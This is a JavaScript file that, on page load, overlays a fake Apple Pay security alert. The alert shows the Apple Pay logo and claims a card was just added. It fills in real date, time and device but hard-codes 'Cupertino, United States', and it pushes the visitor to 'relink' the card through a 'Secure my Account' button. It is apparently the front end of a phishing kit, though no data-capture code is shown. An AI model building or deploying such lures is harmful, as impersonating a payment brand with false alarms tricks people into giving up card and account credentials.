// Apple Pay Security Modal
document.addEventListener('DOMContentLoaded', function() {
    createSecurityModal();
    showSecurityModal();
});

function createSecurityModal() {
    // Create modal overlay
    const modalOverlay = document.createElement('div');
    modalOverlay.className = 'security-modal-overlay';
    modalOverlay.innerHTML = `
        <div class="security-modal-container">
            <div class="security-modal-header">
                <img class="apple-logo" src="https://cdn.builder.io/api/v1/image/assets%2F55f17d293130496d8101acfd884b2c9a%2Fff859b53a2b84301a3d0964e5709a460?format=webp&width=800" alt="Apple Pay Logo">
            </div>
            <div class="security-modal-content">
                <h2 class="security-modal-title">Your card has been added to Apple Pay</h2>
                <p class="security-modal-warning">If you didn't do this, relink your card to avoid unauthorized access.</p>
                
                <div class="security-modal-details">
                    <div class="detail-item">
                        <span class="detail-label">Date:</span>
                        <span class="detail-value">${getCurrentDate()}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Time:</span>
                        <span class="detail-value">${getCurrentTime()}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Country:</span>
                        <span class="detail-value">${getUserCountry()}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">City:</span>
                        <span class="detail-value">${getUserCity()}</span>
                    </div>
                    <div class="detail-item">
                        <span class="detail-label">Device:</span>
                        <span class="detail-value">${getAppleDevice()}</span>
                    </div>
                </div>
                
                <button class="security-modal-button">Secure my Account</button>
            </div>
        </div>
    `;

    document.body.appendChild(modalOverlay);
}

function showSecurityModal() {
    const modal = document.querySelector('.security-modal-overlay');
    setTimeout(() => {
        modal.classList.add('show');
    }, 500);
}

function getCurrentDate() {
    const now = new Date();
    return now.toLocaleDateString('en-US', { 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric' 
    });
}

function getCurrentTime() {
    const now = new Date();
    return now.toLocaleTimeString('en-US', { 
        hour: '2-digit', 
        minute: '2-digit',
        hour12: true 
    });
}

function getUserCountry() {
    return 'United States';
}

function getUserCity() {
    return 'Cupertino';
}

function getAppleDevice() {
    const userAgent = navigator.userAgent;
    if (/iPad/.test(userAgent)) return 'iPad';
    if (/iPhone/.test(userAgent)) return 'iPhone';
    if (/Mac/.test(userAgent)) return 'MacBook';
    return 'Apple Device';
}
